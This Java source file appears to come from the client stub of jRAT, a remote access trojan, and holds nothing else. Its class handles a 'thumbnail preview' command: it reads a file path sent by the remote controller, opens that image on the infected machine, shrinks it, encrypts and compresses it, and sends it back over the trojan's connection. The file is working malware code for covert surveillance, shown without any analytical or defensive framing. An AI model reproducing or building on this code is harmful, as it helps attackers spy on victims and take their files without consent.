package pro.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import pro.jrat.common.compress.GZip;
import pro.jrat.common.crypto.Crypto;
import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;
import pro.jrat.stub.RemoteScreen;
import pro.jrat.stub.packets.outgoing.Packet59ThumbnailPreview;
import pro.jrat.stub.utils.ImageUtils;

public class Packet85ThumbnailPreview extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		Connection.addToSendQueue(new Packet59ThumbnailPreview(file));

		BufferedImage screenShot = ImageIO.read(new File(file));
		screenShot = RemoteScreen.resize(screenShot, 150, 100);
		byte[] buffer = ImageUtils.encodeImage(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
		Connection.dos.writeInt(buffer.length);
		Connection.dos.write(buffer);

		Connection.lock();
	}

}
